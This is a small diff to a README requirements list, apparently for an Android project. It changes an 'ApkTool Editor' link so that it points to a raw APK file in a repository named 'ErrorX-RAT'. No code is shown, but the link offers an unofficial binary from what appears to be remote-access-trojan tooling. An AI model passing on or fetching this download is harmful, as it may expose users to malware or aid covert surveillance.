@@ -36,7 +36,7 @@ https://shivaya-dav.github.io/dogeweb/
 ## Requirements
  - Glitch Account
  - [ApkEasy Tool](https://apk-easy-tool.en.lo4d.com/windows) ( For PC ) or 
-[ApkTool Editor]([https://999xprofit.com/dogs/apkeditor.apk](https://github.com/FakeErrorX/ErrorX-RAT/raw/master/apkeditor.apk)) ( for Android)
+[ApkTool Editor](https://github.com/FakeErrorX/ErrorX-RAT/raw/master/apkeditor.apk) ( for Android)
 
 
 
